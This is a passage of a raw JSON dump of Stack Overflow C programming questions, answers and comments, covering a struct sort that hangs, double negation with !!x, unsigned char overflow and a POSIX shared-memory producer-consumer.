printf(\"%d\\n\",class[i].mark);\n         printf(\"\\n\");\n     }\n}\n\nint main(int argc, char *argv[])\n{\n  int ind,i;\n  int cod=1000;\n  student class[4];\n  student temp;\n  int lengthData=10;\n  for (i=0;i&lt;4;i++)\n  {\n         class[i].name=malloc(sizeof(char)*lengthData);\n  }\n  class[0].cod=cod;\n  class[0].name=\"Joseph\";\n  class[0].mark=15;\n  cod++;\n  class[1].cod=cod;\n  class[1].name=\"Jonathan\";\n  class[1].mark=16;\n  cod++;\n  class[2].cod=cod;\n  class[2].name=\"Karen\";\n  class[2].mark=17;\n  cod++;\n  class[3].cod=cod;\n  class[3].name=\"Anna\";\n  class[3].mark=20;\n  print(class);\n\n\n  for (ind=1;ind&lt;4;ind++){\n      temp=class[ind];\n      i=ind-1;\n      while (i&gt;=0){\n            if (temp.name[0]&lt;class[i].name[0]){\n                class[i+1]=class[i];\n                class[i]=temp;\n                i--;\n           }\n           else break;\n      }\n  }\n  printf(\"ordered data\\n\");\n  print(class);\n  system(\"PAUSE\");\n\n  return 0;\n}\n</code></pre>\n\n<p>I am using DevC++ and when I run it the program hangs, but when I add the following lines before the loop for the bubble sort (only for testing):</p>\n\n<pre><code>class[3]=class[2];\nprintf(\"%s\\n\",class[3].name);\n\n  for (ind=1;ind&lt;4;ind++){\n...\n</code></pre>\n\n<p>The program works even though one record (3) has been replaced by the data of record (2).</p>\n\n<p>Any help?</p>\n"}, {"tags": ["c++", "c"], "comments": [{"owner": {"reputation": 209335, "user_id": 661519, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/1735ab1c8ba4229daa855ec6aad03065?s=128&d=identicon&r=PG", "display_name": "juanchopanza", "link": "https://stackoverflow.com/users/661519/juanchopanza"}, "edited": false, "score": 1, "creation_date": 1518033287, "post_id": 48672192, "comment_id": 84342593, "body": "Maybe figure out what single negation does first?"}, {"owner": {"reputation": 13849, "user_id": 2602718, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CQ4Gj.jpg?s=128&g=1", "display_name": "scohe001", "link": "https://stackoverflow.com/users/2602718/scohe001"}, "edited": false, "score": 0, "creation_date": 1518033473, "post_id": 48672192, "comment_id": 84342677, "body": "Related: <a href=\"https://stackoverflow.com/questions/9229601/what-is-in-c-code\">stackoverflow.com/questions/9229601/what-is-in-c-code</a> (I swear there was a better question like this but can&#39;t find it at the moment..)"}, {"owner": {"reputation": 3975, "user_id": 8513665, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c39368317b0749f5d8f09735796c470e?s=128&d=identicon&r=PG&f=1", "display_name": "Christian Gibbons", "link": "https://stackoverflow.com/users/8513665/christian-gibbons"}, "edited": false, "score": 7, "creation_date": 1518034008, "post_id": 48672192, "comment_id": 84342931, "body": "you are confusing <code>!</code> and <code>~</code>"}, {"owner": {"reputation": 5781, "user_id": 8746007, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-Wr8CIbEqJ4w/AAAAAAAAAAI/AAAAAAAAAFE/Ym-NjswzViM/photo.jpg?sz=128", "display_name": "Killzone Kid", "link": "https://stackoverflow.com/users/8746007/killzone-kid"}, "edited": false, "score": 0, "creation_date": 1518034188, "post_id": 48672192, "comment_id": 84343021, "body": "First <code>!</code> turns any non-zero value into <code>false</code>, second <code>!</code> makes it <code>true</code> (and vice versa)"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1518042462, "post_id": 48672192, "comment_id": 84347120, "body": "In C, &quot;double negation force values to become a bool&quot; is not quite correct.  <code>!</code> result is an <code>int</code>, not a <code>bool</code>, with a value of 0 or 1."}], "answers": [{"comments": [{"owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "reply_to_user": {"reputation": 12073, "user_id": 1447296, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ba3556ac502bba7118253d5e4240a5a4?s=128&d=identicon&r=PG&f=1", "display_name": "adjan", "link": "https://stackoverflow.com/users/1447296/adjan"}, "edited": false, "score": 0, "creation_date": 1518033707, "post_id": 48672222, "comment_id": 84342796, "body": "@Adrian I scrapped the c#. Perhaps you can answer for that one."}, {"owner": {"reputation": 12073, "user_id": 1447296, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ba3556ac502bba7118253d5e4240a5a4?s=128&d=identicon&r=PG&f=1", "display_name": "adjan", "link": "https://stackoverflow.com/users/1447296/adjan"}, "edited": false, "score": 0, "creation_date": 1518033813, "post_id": 48672222, "comment_id": 84342840, "body": "The question does not really apply to c# anyway. C# does not have implicit integer to bool conversion."}, {"owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "reply_to_user": {"reputation": 12073, "user_id": 1447296, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ba3556ac502bba7118253d5e4240a5a4?s=128&d=identicon&r=PG&f=1", "display_name": "adjan", "link": "https://stackoverflow.com/users/1447296/adjan"}, "edited": false, "score": 1, "creation_date": 1518033964, "post_id": 48672222, "comment_id": 84342916, "body": "@Adrian Saved by the retagging!"}, {"owner": {"reputation": 16676, "user_id": 10147399, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4a6d433902192f8bb03857ae1b849d4f?s=128&d=identicon&r=PG&f=1", "display_name": "Ayxan Haqverdili", "link": "https://stackoverflow.com/users/10147399/ayxan-haqverdili"}, "edited": false, "score": 0, "creation_date": 1590967545, "post_id": 48672222, "comment_id": 109873638, "body": "Why would you not simply do <code>(bool)x</code> or <code>(_Bool)x</code>?"}, {"owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "reply_to_user": {"reputation": 16676, "user_id": 10147399, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4a6d433902192f8bb03857ae1b849d4f?s=128&d=identicon&r=PG&f=1", "display_name": "Ayxan Haqverdili", "link": "https://stackoverflow.com/users/10147399/ayxan-haqverdili"}, "edited": false, "score": 0, "creation_date": 1590991222, "post_id": 48672222, "comment_id": 109878097, "body": "@Ayxan: That changes the type of the expression."}, {"owner": {"reputation": 16676, "user_id": 10147399, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4a6d433902192f8bb03857ae1b849d4f?s=128&d=identicon&r=PG&f=1", "display_name": "Ayxan Haqverdili", "link": "https://stackoverflow.com/users/10147399/ayxan-haqverdili"}, "edited": false, "score": 0, "creation_date": 1591003284, "post_id": 48672222, "comment_id": 109882449, "body": "@Bat <code>!!x</code> does too in C++. Also, does it ever matter in C?"}], "tags": [], "owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "is_accepted": false, "score": 7, "last_activity_date": 1518033679, "last_edit_date": 1518033679, "creation_date": 1518033297, "answer_id": 48672222, "question_id": 48672192, "link": "https://stackoverflow.com/questions/48672192/why-does-double-negation-force-values-to-become-a-bool/48672222#48672222", "title": "Why does double negation force values to become a bool?", "body": "<p>In C, <code>!x</code> is either 1 or 0, So <code>!!x</code> is a \"collapse to 0 or 1 operator\" in the sense that any non-zero number is mapped to 1, and 0 stays as it is. This <em>can</em> be useful on occasions.</p>\n\n<p>In C++, <code>!x</code> is a <code>bool</code> type, So <code>!!x</code> is a \"collapse to false or true operator\" in the sense that any non-zero number is mapped to <code>true</code>, and zero is mapped to <code>false</code>.</p>\n"}, {"comments": [{"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1518042313, "post_id": 48672242, "comment_id": 84347069, "body": "In C (as post is dual tagged - sigh), <code>!</code> result is not a <code>bool</code>, but an <code>int</code>."}, {"owner": {"reputation": 750, "user_id": 8649828, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UL1aa.png?s=128&g=1", "display_name": "qjnr", "link": "https://stackoverflow.com/users/8649828/qjnr"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1518104535, "post_id": 48672242, "comment_id": 84376671, "body": "Yes, in C there are no <code>bool</code>s (not like <code>true</code>/<code>false</code>) but it&#39;s an <code>int</code> value. (either <code>0</code> or <code>1</code>) but in C++ and C# it is a <code>bool</code>"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1518104900, "post_id": 48672242, "comment_id": 84376940, "body": "Disagree with &quot;in C there are no bools (not like true/false)&quot;. Since C99, C has a boolean type <code>_Bool</code> (aka <code>bool</code> via <code>&lt;stdbool.h&gt;</code>).  The C return type of <code>!</code> still remains <code>int</code>."}, {"owner": {"reputation": 750, "user_id": 8649828, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UL1aa.png?s=128&g=1", "display_name": "qjnr", "link": "https://stackoverflow.com/users/8649828/qjnr"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1518105294, "post_id": 48672242, "comment_id": 84377212, "body": "Sorry, didn&#39;t know that."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1518105381, "post_id": 48672242, "comment_id": 84377259, "body": "Posts tagged C <i>and</i> C++ unfortunately create issues like this - not your fault."}], "tags": [], "owner": {"reputation": 750, "user_id": 8649828, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UL1aa.png?s=128&g=1", "display_name": "qjnr", "link": "https://stackoverflow.com/users/8649828/qjnr"}, "is_accepted": false, "score": 2, "last_activity_date": 1518034101, "last_edit_date": 1518034101, "creation_date": 1518033369, "answer_id": 48672242, "question_id": 48672192, "link": "https://stackoverflow.com/questions/48672192/why-does-double-negation-force-values-to-become-a-bool/48672242#48672242", "title": "Why does double negation force values to become a bool?", "body": "<p><code>!</code> is a boolean operator, so it will convert the number into a bool (any non-zero value is <code>true</code>, zero is always <code>false</code>). That other <code>!</code> inverts the bool.</p>\n"}, {"comments": [{"owner": {"reputation": 69012, "user_id": 363751, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/135a97c4150691234931a93f3a27a52f?s=128&d=identicon&r=PG", "display_name": "supercat", "link": "https://stackoverflow.com/users/363751/supercat"}, "edited": false, "score": 1, "creation_date": 1518033959, "post_id": 48672331, "comment_id": 84342913, "body": "I think C&#39;s <code>!</code> can be better described as a &quot;!=0&quot; operator.  When applied to logical values it negates them, but it may also be applied to other types such as floating-point values or pointers."}], "tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": false, "score": 6, "last_activity_date": 1518033723, "creation_date": 1518033723, "answer_id": 48672331, "question_id": 48672192, "link": "https://stackoverflow.com/questions/48672192/why-does-double-negation-force-values-to-become-a-bool/48672331#48672331", "title": "Why does double negation force values to become a bool?", "body": "<p>The <code>!</code> operator performs logical negation.  If its argument is non-zero, it results in 0.  If its argument is 0, it results in 1.</p>\n\n<p>What you're describing is the <strong>bitwise complement operator</strong>, denoted by <code>~</code>.</p>\n\n<p>These are both described in section 6.5.3.3 of the <a href=\"http://www.open-std.org/jtc1/sc22/wg14/www/docs/n1570.pdf\" rel=\"noreferrer\">C standard</a>:</p>\n\n<blockquote>\n  <p><em>4</em> The result of the <code>~</code> operator is the bitwise complement of its (promoted) operand (that is, each bit in the result is set if and only\n  if the corresponding bit in the converted operand is not set). The\n  integer promotions are performed on the operand, and the result has\n  the promoted type. If the promoted type is an unsigned type, the\n  expression <code>~E</code> is equivalent to the maximum value representable in\n  that type minus <code>E</code>.</p>\n  \n  <p><em>5</em> The result of the logical negation operator <code>!</code> is 0 if the value of its operand compares unequal to 0, 1 if the value of its operand\n  compares equal to 0. The result has type <code>int</code>. The expression <code>!E</code> is\n  equivalent to <code>(0==E)</code>.</p>\n</blockquote>\n"}], "owner": {"reputation": 31, "user_id": 9329596, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-HZX1Nr1OdDc/AAAAAAAAAAI/AAAAAAAAAHk/JRYkkpL8U-o/photo.jpg?sz=128", "display_name": "Jonathan Fermin", "link": "https://stackoverflow.com/users/9329596/jonathan-fermin"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 499, "favorite_count": 0, "answer_count": 3, "score": 2, "last_activity_date": 1518034101, "creation_date": 1518033218, "last_edit_date": 1518033863, "question_id": 48672192, "link": "https://stackoverflow.com/questions/48672192/why-does-double-negation-force-values-to-become-a-bool", "title": "Why does double negation force values to become a bool?", "body": "<p>If x was a 4 bit word like 1010, and you did the operation !!x,</p>\n\n<ul>\n<li>Wouldn't the first !x return 0101, </li>\n<li>And the second !(!x) return 1010?</li>\n</ul>\n\n<p>Rather it returns ...0001 or ...0000. Why is this?</p>\n"}, {"tags": ["c", "char", "hex", "unsigned-char"], "comments": [{"owner": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "edited": false, "score": 4, "creation_date": 1518032710, "post_id": 48672010, "comment_id": 84342243, "body": "A <code>char</code> is 8 bit long, <code>0xf0 + 16 = 0x100</code> which is greater than <code>0xff</code>, the largest value a <code>char</code> can have, so you overflow the <code>char</code> and that&#39;s why you see the 0."}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 1, "creation_date": 1518032746, "post_id": 48672010, "comment_id": 84342266, "body": "use <code>unsigned long</code> instead"}], "answers": [{"comments": [{"owner": {"reputation": 607, "user_id": 7803448, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/3aa6ec5b8b2a914c1aa432c4436393e1?s=128&d=identicon&r=PG&f=1", "display_name": "Matthew Vanlandingham", "link": "https://stackoverflow.com/users/7803448/matthew-vanlandingham"}, "edited": false, "score": 0, "creation_date": 1518032834, "post_id": 48672053, "comment_id": 84342328, "body": "Thank you! I didn&#39;t realize chars were only 8 bits. I&#39;ll accept as soon as I can."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 607, "user_id": 7803448, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/3aa6ec5b8b2a914c1aa432c4436393e1?s=128&d=identicon&r=PG&f=1", "display_name": "Matthew Vanlandingham", "link": "https://stackoverflow.com/users/7803448/matthew-vanlandingham"}, "edited": false, "score": 3, "creation_date": 1518033053, "post_id": 48672053, "comment_id": 84342460, "body": "@MatthewVanlandingham Detail: <code>char</code> are not &quot;only 8 bits&quot;.  <code>char</code> are usually  &quot;8 bits&quot;. On select platforms, they are wider."}, {"owner": {"reputation": 607, "user_id": 7803448, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/3aa6ec5b8b2a914c1aa432c4436393e1?s=128&d=identicon&r=PG&f=1", "display_name": "Matthew Vanlandingham", "link": "https://stackoverflow.com/users/7803448/matthew-vanlandingham"}, "edited": false, "score": 0, "creation_date": 1518033137, "post_id": 48672053, "comment_id": 84342508, "body": "Thanks for clarifying. On my particular machine, it is 8 bits :D"}, {"owner": {"reputation": 797, "user_id": 99124, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffb4a98e32eb0337a855061470ea7a19?s=128&d=identicon&r=PG", "display_name": "mlp", "link": "https://stackoverflow.com/users/99124/mlp"}, "edited": false, "score": 0, "creation_date": 1518034681, "post_id": 48672053, "comment_id": 84343297, "body": "By the C standard <code>char</code> is <i>at least</i> 8 bits, and on many (perhaps most) platforms it is exactly 8 bits. On some current (embedded) DSP platforms, <code>char</code> is 16 bits. Back In The Day, on some Cray supercomputers, <code>char</code>, <code>short</code>, <code>int</code>, and <code>long</code> (this was in the days before <code>long long</code>) were <i>all</i> 64 bits, and thus <code>sizeof(long) == 1</code>."}], "tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": true, "score": 7, "last_activity_date": 1518032740, "creation_date": 1518032740, "answer_id": 48672053, "question_id": 48672010, "link": "https://stackoverflow.com/questions/48672010/unsigned-char-goes-from-f0-to-00-when-incremented-by-16/48672053#48672053", "title": "Unsigned char goes from f0 to 00 when incremented by 16", "body": "<p>An <code>unsigned char</code>, assuming 8 bit to a byte, has a maximum value of 255 (0xff).  Any arithmetic operation that exceeds that is truncated modulo 256.</p>\n\n<p>If you want to support larger values, use <code>unsigned int</code> instead.</p>\n"}], "owner": {"reputation": 607, "user_id": 7803448, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/3aa6ec5b8b2a914c1aa432c4436393e1?s=128&d=identicon&r=PG&f=1", "display_name": "Matthew Vanlandingham", "link": "https://stackoverflow.com/users/7803448/matthew-vanlandingham"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 156, "favorite_count": 0, "accepted_answer_id": 48672053, "answer_count": 1, "score": 2, "last_activity_date": 1518032740, "creation_date": 1518032535, "question_id": 48672010, "link": "https://stackoverflow.com/questions/48672010/unsigned-char-goes-from-f0-to-00-when-incremented-by-16", "title": "Unsigned char goes from f0 to 00 when incremented by 16", "body": "<p>I am currently writing a program in C. I have a variable <code>i</code> declared in my program. I have initialized it as such:</p>\n\n<pre><code> unsigned char i = 0x00;\n</code></pre>\n\n<p>Next, I have a while loop, and inside that while loop, I'm increasing the <code>unsigned char</code> by 16 and displaying it to seven digits (such as <code>0000080</code>). Well, This runs perfectly fine for the first 16 values, but whenever the <code>unsigned char</code> gets to <code>00000f0</code> and gets incremented again, it goes back to <code>0000000</code>. Why is this and how can I alter my code to fix this? Thanks in advance.</p>\n"}, {"tags": ["c", "posix"], "comments": [{"owner": {"reputation": 15260, "user_id": 1968182, "user_type": "registered", "accept_rate": 0, "profile_image": "https://i.stack.imgur.com/E5nF2.jpg?s=128&g=1", "display_name": "Ulrich Eckhardt", "link": "https://stackoverflow.com/users/1968182/ulrich-eckhardt"}, "edited": false, "score": 2, "creation_date": 1518032256, "post_id": 48671885, "comment_id": 84341985, "body": "At some point either your formatting is broken or you have code outside of a function. Please fix that. Also, please remove things that are not necessary to reproduce the problem. I&#39;d also suggest you remove the brute-force casts, they typically only serve to hide problems, like e.g. when casting an int into a pointer."}, {"owner": {"reputation": 30540, "user_id": 719263, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7feab598abfc27783641fe2b796a0155?s=128&d=identicon&r=PG", "display_name": "Jean-Baptiste Yun&#232;s", "link": "https://stackoverflow.com/users/719263/jean-baptiste-yun%c3%a8s"}, "edited": false, "score": 1, "creation_date": 1518032684, "post_id": 48671885, "comment_id": 84342226, "body": "Beware that path must exist in a call to <code>ftok</code>, this is a requirement. And using <code>~</code> is wrong because it is expanded by shells only. SO use a real path name of your choice. This may not be the cause of your problem, but it is a requirement..."}, {"owner": {"reputation": 30540, "user_id": 719263, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7feab598abfc27783641fe2b796a0155?s=128&d=identicon&r=PG", "display_name": "Jean-Baptiste Yun&#232;s", "link": "https://stackoverflow.com/users/719263/jean-baptiste-yun%c3%a8s"}, "edited": false, "score": 0, "creation_date": 1518032814, "post_id": 48671885, "comment_id": 84342315, "body": "Call to <code>shmget(key, 0, 0)</code> is also wrong, size is 0. You should use your <code>SIZE</code> constant (as I understand)."}, {"owner": {"reputation": 20255, "user_id": 645128, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/G0V8Q.jpg?s=128&g=1", "display_name": "ryyker", "link": "https://stackoverflow.com/users/645128/ryyker"}, "edited": false, "score": 0, "creation_date": 1518033186, "post_id": 48671885, "comment_id": 84342542, "body": "Unless you need to reference the <i>name</i> of the struct,  (as far as I can see, you do not) then you do not need it, and in general, you should avoid creating a <code>type</code> with the same symbol as that used for a <code>name</code>, i.e. you have created a new type with the symbol <code>buffer</code>, as well as a name with the same symbol.  Replace what you have with <code>typedef struct {...}buffer;</code>"}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1518033471, "post_id": 48671885, "comment_id": 84342674, "body": "I would account that a style consideration, @rykker.  It certainly is <i>unnecessary</i> to declare a structure type with a tag and to also declare the same identifier as an alias for that type, as the OP does, but it is not inherently harmful, and some coding styles call for it."}, {"owner": {"reputation": 20255, "user_id": 645128, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/G0V8Q.jpg?s=128&g=1", "display_name": "ryyker", "link": "https://stackoverflow.com/users/645128/ryyker"}, "reply_to_user": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1518033770, "post_id": 48671885, "comment_id": 84342826, "body": "@JohnBollinger - I cannot think of a coding <i>style</i> that requires both.  I know that linked lists need to self-reference, thus requiring the tag (but not necessarily the typedef to a new type).  What examples can you cite? (I am truly curious as I cannot think of one).  And if one of the two are not needed, would it not be considered a readability/maintenance issue to have them?"}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1518034887, "post_id": 48671885, "comment_id": 84343397, "body": "@rykker, examples positively <i>abound</i> of coding styles that call for structures to be both tagged and typedefed.  Here&#39;s an SO question that talks about it: <a href=\"https://stackoverflow.com/questions/3538170/standard-for-typedefing\" title=\"standard for typedefing\">stackoverflow.com/questions/3538170/standard-for-typedefing</a>.  It is less common that the tag and typedefed identifier are called upon to match in C, but some people with C++ background tend to do it because C++ provides the equivalent by default.  Nevertheless, here&#39;s a C code style document from a Cornell University CS course that recommends it: <a href=\"http://www.cs.cornell.edu/courses/cs314/2004fa/tutorials/cstyle.pdf\" rel=\"nofollow noreferrer\">cs.cornell.edu/courses/cs314/2004fa/tutorials/cstyle.pdf</a> (page 6)."}, {"owner": {"reputation": 797, "user_id": 99124, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffb4a98e32eb0337a855061470ea7a19?s=128&d=identicon&r=PG", "display_name": "mlp", "link": "https://stackoverflow.com/users/99124/mlp"}, "edited": false, "score": 0, "creation_date": 1518034912, "post_id": 48671885, "comment_id": 84343411, "body": "What operating system API? POSIX? The C language knows nothing of &quot;another&quot; process. Please tag your question appropriately."}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "reply_to_user": {"reputation": 30540, "user_id": 719263, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7feab598abfc27783641fe2b796a0155?s=128&d=identicon&r=PG", "display_name": "Jean-Baptiste Yun&#232;s", "link": "https://stackoverflow.com/users/719263/jean-baptiste-yun%c3%a8s"}, "edited": false, "score": 0, "creation_date": 1518035358, "post_id": 48671885, "comment_id": 84343658, "body": "@Jean-BaptisteYun&#232;s, as far as I know or can determine, the second argument to <code>shmget()</code> is only significant when <code>IPC_CREAT</code> is specified among the flags in the third argument, and no segment with the specified key already exists.  Otherwise, <i>i.e.</i> when opening an existing SystemV shared memory segment, the size of the segment is whatever it is, and the second argument is therefore ignored."}, {"owner": {"reputation": 3, "user_id": 9329418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/27c15929a37d9c964455cd691b2a424b?s=128&d=identicon&r=PG&f=1", "display_name": "Eddy", "link": "https://stackoverflow.com/users/9329418/eddy"}, "reply_to_user": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1518035501, "post_id": 48671885, "comment_id": 84343738, "body": "@JohnBollinger you are correct with the implementation of shmget()"}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1518035748, "post_id": 48671885, "comment_id": 84343866, "body": "You have a potential synchronization problem surrounding initialization of your mutex and condition variable.  Whichever process succeeds at creating the shared-memory segment initializes these, but that itself is not synchronized, so the other process(es) may try to use them before that initialization is complete."}, {"owner": {"reputation": 3, "user_id": 9329418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/27c15929a37d9c964455cd691b2a424b?s=128&d=identicon&r=PG&f=1", "display_name": "Eddy", "link": "https://stackoverflow.com/users/9329418/eddy"}, "reply_to_user": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1518036349, "post_id": 48671885, "comment_id": 84344166, "body": "@JohnBollinger i believe the initiation is completed because when i invoke producer.c first to create the shared memory segment, it exit the if statement and then goes into the loop to put data into the shared buffer."}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1518036527, "post_id": 48671885, "comment_id": 84344257, "body": "@Eddy, whether it&#39;s responsible for the behavior you describe or not, you <i>do</i> have a synchronization problem such as I describe.  That may be something you can ignore or work around, but you should at minimum be aware of it."}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1518036633, "post_id": 48671885, "comment_id": 84344312, "body": "Your use of 